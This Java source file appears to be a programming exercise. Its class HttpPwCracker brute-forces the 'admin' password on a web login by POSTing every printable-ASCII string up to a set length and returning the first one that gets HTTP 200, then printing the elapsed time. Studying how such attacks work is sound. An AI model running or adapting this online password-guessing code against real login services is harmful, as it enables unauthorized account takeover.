package org.example;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.LocalTime;
import java.time.temporal.ChronoUnit;

public class HttpPwCracker implements PwCracker {


    private final HttpClient httpClient;

    public HttpPwCracker() {
        this.httpClient = HttpClient.newHttpClient();
    }

    private String recursiveCracker(String url, int maxLength, int currentLength, byte[] currentPassword) {
        if (currentLength == maxLength) {

            try {
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(new URI(url))
                        .headers("Content-Type", "application/json;charset=UTF-8")
                        .POST(HttpRequest.BodyPublishers.ofString("{\"username\":\"admin\",\"password\":\"" + new String(currentPassword) + "\"}"))
                        .build();
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() == 200) {
                    return new String(currentPassword);
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            return null;
        }

        for (int i = 33; i < 126; i++) {
            currentPassword[currentLength] = (byte) i;
            String result = recursiveCracker(url, maxLength, currentLength + 1, currentPassword);
            if (result != null) {
                return result;
            }
        }

        return null;
    }

    public String crack(int maxLength, String url) {

        LocalTime start = LocalTime.now();

        for (int length = 1; length <= maxLength; length++) {
            byte[] passwordBytes = new byte[length];
            String result = recursiveCracker(url, length, 0, passwordBytes);
            if (result != null) {
                LocalTime end = LocalTime.now();
                System.out.println(start.until(end, ChronoUnit.SECONDS) + " seconds");
                return result;
            }
        }
        return "Not found";
    }
}
